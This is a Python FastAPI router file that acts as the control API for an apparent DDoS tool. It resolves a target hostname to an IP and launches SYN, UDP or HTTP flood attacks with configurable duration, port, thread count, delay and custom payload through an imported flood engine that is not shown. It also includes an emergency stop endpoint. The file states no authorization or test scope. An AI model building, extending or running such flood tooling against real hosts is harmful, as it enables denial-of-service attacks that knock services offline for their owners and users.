from fastapi import APIRouter, HTTPException, BackgroundTasks
from pydantic import BaseModel
import socket
from app.services.ddos_engine import start_syn_flood, start_udp_flood, start_http_flood, stop_event
from app.websocket.manager import manager

router = APIRouter()

class DDoSRequest(BaseModel):
    target_ip: str
    attack_type: str
    duration: int
    port: int = 80
    threads: int = 1
    speed_delay: float = 0.0      # seconds between packets per thread
    custom_payload: str = ""       # UDP custom payload
    subsite: str = "/"             # HTTP subsite path
    wait_for_reply: bool = False   # HTTP wait for response

@router.get("/resolve")
async def resolve_host(url: str):
    try:
        hostname = url.replace("https://", "").replace("http://", "").split('/')[0]
        ip = socket.gethostbyname(hostname)
        return {"hostname": hostname, "ip": ip}
    except Exception:
        raise HTTPException(status_code=400, detail="DNS Resolution Failed")

@router.post("/execute")
async def execute_ddos(request: DDoSRequest, background_tasks: BackgroundTasks):
    if request.attack_type == "SYN Flood":
        background_tasks.add_task(
            start_syn_flood,
            request.target_ip, request.duration,
            request.port, request.threads, request.speed_delay
        )
    elif request.attack_type == "UDP Flood":
        background_tasks.add_task(
            start_udp_flood,
            request.target_ip, request.duration,
            request.port, request.threads, request.custom_payload, request.speed_delay
        )
    elif request.attack_type == "HTTP Flood":
        background_tasks.add_task(
            start_http_flood,
            request.target_ip, request.duration,
            request.port, request.threads,
            request.subsite, request.wait_for_reply, request.speed_delay
        )
    return {"status": "started"}

@router.post("/stop")
async def stop_attack():
    stop_event.set()
    await manager.broadcast({"type": "ddos_status", "message": "EMERGENCY STOP SIGNAL RECEIVED", "active": False})
    return {"status": "stopping"}